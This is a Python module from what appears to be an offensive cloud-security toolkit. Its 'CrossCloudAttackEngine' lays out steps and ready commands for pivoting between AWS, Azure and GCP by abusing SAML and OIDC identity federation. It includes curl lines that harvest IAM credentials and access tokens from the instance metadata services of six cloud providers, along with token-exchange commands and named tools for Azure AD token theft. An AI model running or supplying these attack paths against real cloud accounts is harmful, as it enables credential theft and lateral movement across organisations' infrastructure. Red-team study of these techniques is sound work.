"""Cross-cloud identity paths — multi-cloud identity federation abuse.

Implements attack paths that bridge cloud providers through identity
federation: Azure AD -> AWS (SAML federation), GCP -> Azure (OIDC
federation), multi-cloud metadata harvesting, and cross-cloud service
account impersonation through workload identity federation.

Allows attackers to pivot from one cloud to another using federated
identities, expanding compromise radius across multi-cloud environments.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any

CROSS_CLOUD_ATTACKS = [
    "azure_saml_to_aws",
    "gcp_oidc_to_azure",
    "aws_oidc_to_gcp",
    "entra_id_to_gcp_workforce_federation",
    "okta_to_all_clouds",
    "adfs_to_aws",
    "kubernetes_to_cloud_metadata",
    "github_actions_to_cloud",
]


@dataclass
class CrossCloudConfig:
    """Configuration for cross-cloud identity attacks.

    Attributes:
        source_cloud: Source cloud provider (aws, azure, gcp).
        target_cloud: Target cloud provider.
        azure_tenant_id: Azure AD tenant ID.
        aws_account_id: AWS account ID.
        aws_role_arn: AWS IAM role ARN for federation.
        gcp_project_id: GCP project ID.
        gcp_workload_pool: GCP workload identity pool.
        federation_metadata_url: SAML/OIDC metadata URL.
    """

    source_cloud: str = ""
    target_cloud: str = ""
    azure_tenant_id: str = ""
    aws_account_id: str = ""
    aws_role_arn: str = ""
    gcp_project_id: str = ""
    gcp_workload_pool: str = ""
    federation_metadata_url: str = ""


class CrossCloudAttackEngine:
    """Execute cross-cloud identity federation attacks.

    Bridges identity providers across AWS, Azure, and GCP using SAML 2.0
    and OIDC federation to pivot between cloud environments.

    Attributes:
        config: CrossCloudConfig with federation parameters.
    """

    def __init__(self, config: CrossCloudConfig | None = None):
        self.config = config or CrossCloudConfig()

    def azure_saml_to_aws(self) -> dict[str, Any]:
        """Abuse Azure AD SAML federation to gain AWS access.

        If Azure AD is configured as a SAML IdP for AWS IAM Identity Center
        or direct SAML federation, an attacker with Azure AD access can
        assume AWS IAM roles.

        Returns:
            Dict with attack steps, commands, and required permissions.
        """
        return {
            "attack_type": "azure_saml_to_aws",
            "prerequisites": [
                "Active Azure AD user account (or Global Admin)",
                "Azure AD SAML app for AWS IAM Identity Center or AWS SSO",
                "SAML response signing certificate accessible",
            ],
            "attack_path": "Azure AD -> SAML Assertion -> AWS STS AssumeRoleWithSAML -> AWS Credentials",
            "steps": [
                "1. Authenticate to Azure AD as the target user",
                "2. Trigger SAML authentication to the AWS app",
                "3. Capture the SAML assertion from the HTTP POST or browser",
                "4. Extract the SAML Response from the IdP-initiated flow",
                "5. Use aws sts assume-role-with-saml with the SAML assertion",
            ],
            "commands": [
                "aws sts assume-role-with-saml --role-arn ROLE_ARN --principal-arn PRINCIPAL_ARN --saml-assertion SAML_BASE64",
                "# Enumerate roles from the SAML IdP:",
                "curl -s 'https://signin.aws.amazon.com/static/saml-metadata.xml' -o aws_saml_metadata.xml",
            ],
            "tools": [
                "roadrecon / roadtx for Azure AD token theft",
                "aws-azure-login for automated SAML-based AWS access",
                "saml2aws for CLI-based SAML to AWS STS",
            ],
        }

    def gcp_oidc_to_azure(self) -> dict[str, Any]:
        """Abuse GCP OIDC federation to gain Azure access.

        GCP workload identity federation allows GCP service accounts to
        authenticate to Azure AD via OIDC and obtain Azure access tokens.

        Returns:
            Dict with attack steps and token exchange commands.
        """
        return {
            "attack_type": "gcp_oidc_to_azure",
            "prerequisites": [
                "Access to a GCP service account with workload identity federation configured",
                "Azure AD app registration with federated credential for GCP",
                "Target Azure tenant allows external identities",
            ],
            "attack_path": "GCP Service Account -> OIDC Token -> Azure AD Token Exchange -> Azure Resources",
            "steps": [
                "1. Obtain GCP service account credentials",
                "2. Generate a GCP identity token for the Azure AD audience",
                "3. Exchange the OIDC token for an Azure AD token via OAuth2",
                "4. Use the Azure AD token to access Azure resources or Microsoft Graph",
            ],
            "commands": [
                "gcloud auth print-identity-token --audiences='api://AzureADTokenExchange'",
                'curl -X POST https://login.microsoftonline.com/TENANT_ID/oauth2/v2.0/token -d "grant_type=client_credentials&client_id=CLIENT_ID&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=GCP_TOKEN&scope=https://graph.microsoft.com/.default"',
            ],
        }

    def aws_oidc_to_gcp(self) -> dict[str, Any]:
        """Abuse AWS OIDC federation to gain GCP access.

        GCP Workload Identity Federation can trust AWS as an OIDC identity
        provider. An attacker with AWS access can generate OIDC tokens
        to impersonate GCP service accounts.

        Returns:
            Dict with AWS-to-GCP attack path.
        """
        return {
            "attack_type": "aws_oidc_to_gcp",
            "prerequisites": [
                "AWS credentials for a role/user that can call sts:GetCallerIdentity",
                "GCP Workload Identity Federation configured to trust AWS",
                "GCP service account with roles/iam.workloadIdentityUser bound to AWS principal",
            ],
            "attack_path": "AWS Credentials -> AWS OIDC Token -> GCP STS Token Exchange -> GCP Credentials",
            "steps": [
                "1. Generate an AWS GetCallerIdentity token",
                "2. Use the GCP Security Token Service to exchange the AWS token for GCP credentials",
                "3. Authenticate to GCP with the federated identity",
            ],
            "commands": [
                "curl -s 'https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15' -H 'Authorization: AWS4-HMAC-SHA256 ...'",
                "gcloud auth login --cred-file=gcp_workload_identity_config.json",
                "# Generate federated token:",
                "gcloud iam workload-identity-pools create-cred-config \\",
                "  projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/POOL_ID/providers/PROVIDER_ID \\",
                "  --service-account=SA@PROJECT.iam.gserviceaccount.com \\",
                "  --aws --output-file=creds.json",
            ],
        }

    def multi_cloud_imds_harvesting(self) -> dict[str, Any]:
        """Harvest metadata from all cloud providers simultaneously.

        Useful on multi-cloud or hybrid environments where workloads may
        have access to multiple cloud metadata services.

        Returns:
            Dict with multi-cloud metadata harvesting commands.
        """
        return {
            "attack_type": "multi_cloud_imds",
            "aws_imds": [
                "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "curl -s http://169.254.169.254/latest/user-data/",
            ],
            "azure_imds": [
                "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
                "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'",
            ],
            "gcp_imds": [
                "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'",
                "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/?recursive=true'",
            ],
            "oracle_imds": [
                "curl -s http://169.254.169.254/opc/v2/instance/",
                "curl -s http://169.254.169.254/opc/v2/iam/",
            ],
            "digitalocean_imds": [
                "curl -s http://169.254.169.254/metadata/v1.json",
                "curl -s http://169.254.169.254/metadata/v1/id",
            ],
            "alibaba_imds": [
                "curl -s http://100.100.100.200/latest/meta-data/",
                "curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/ROLE_NAME",
            ],
        }

    def entra_id_to_gcp_workforce_federation(self) -> dict[str, Any]:
        """Exploit Entra ID to GCP workforce identity federation.

        Microsoft Entra ID can serve as an identity provider for GCP
        workforce identity federation. Compromising Entra ID accounts
        with GCP federation grants GCP console/CLI access.

        Returns:
            Dict with Entra-to-GCP attack steps.
        """
        return {
            "attack_type": "entra_id_to_gcp",
            "prerequisites": [
                "Entra ID user with access to GCP workforce pool",
                "GCP workforce identity pool configured with Entra ID as IdP",
                "roles/iam.workforcePoolUser role on the workforce pool",
            ],
            "steps": [
                "1. Obtain Entra ID user credentials",
                "2. Authenticate to Entra ID and get ID token",
                "3. Exchange Entra ID token for GCP access token via workforce federation",
                "4. Access GCP resources as the federated identity",
            ],
            "commands": [
                "gcloud auth login --cred-file=workforce_pool_config.json",
                "# workforce pool config template:",
                '{"type": "external_account", "audience": "//iam.googleapis.com/locations/global/workforcePools/POOL_ID/providers/PROVIDER_ID", ...}',
            ],
        }

    def detect_cross_cloud_federation(self) -> dict[str, Any]:
        """Detect cross-cloud federation configurations for attack surface mapping.

        Returns:
            Dict with detection commands per provider.
        """
        return {
            "attack_type": "cross_cloud_detection",
            "aws_detection": [
                "aws iam list-saml-providers",
                "aws iam list-open-id-connect-providers",
                "aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.Federated]]'",
            ],
            "azure_detection": [
                "az ad app list --query '[].{AppId:appId, DisplayName:displayName}'",
                "az ad app federated-credential list --id APP_ID",
            ],
            "gcp_detection": [
                "gcloud iam workload-identity-pools list --location=global",
                "gcloud iam workforce-pools list --location=global",
                "gcloud iam workload-identity-pools providers list --workload-identity-pool=POOL_ID --location=global",
            ],
        }

    def summary(self) -> dict[str, Any]:
        return {
            "available_attacks": CROSS_CLOUD_ATTACKS,
            "source_cloud": self.config.source_cloud,
            "target_cloud": self.config.target_cloud,
            "federation_detection": self.detect_cross_cloud_federation(),
        }
